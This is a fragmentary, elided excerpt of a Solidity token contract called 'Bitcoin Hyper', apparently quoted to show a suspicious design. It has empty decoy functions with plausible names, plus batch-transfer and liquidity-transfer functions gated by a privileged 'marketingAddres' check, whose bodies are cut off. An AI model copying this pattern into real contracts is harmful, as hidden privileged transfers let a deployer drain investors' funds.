...
contract BitcoinHyper is Ownable {
    ...
    string private _name = "Bitcoin Hyper";
    ...
    function allowanceChange() external {
    }
    function allowanceMax() external {
    }
    function spenderSwap() external {
    }
    function spenderOpen() public {
    }
    function transferGas(address[] calldata walletAddress) external {
    ...
    function transferLP(uint256 amount, address walletAddr) external {
        if (marketingAddres()) {
